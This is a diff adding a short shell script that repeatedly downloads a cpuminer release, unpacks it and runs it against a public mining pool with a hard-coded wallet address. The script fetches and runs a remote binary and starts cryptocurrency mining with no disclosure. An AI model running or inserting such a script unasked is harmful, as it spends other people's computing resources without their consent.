@@ -1,0 +1,10 @@
+#!/bin/sh
+ 
+COUNTER=40
+until [  $COUNTER -lt 20 ]; do
+ 
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.21/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u DMBFX5gFno5GWBv4cmpsiN2uviVRRyfZQ9 -p c=DGB -a yespower 
+ 
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
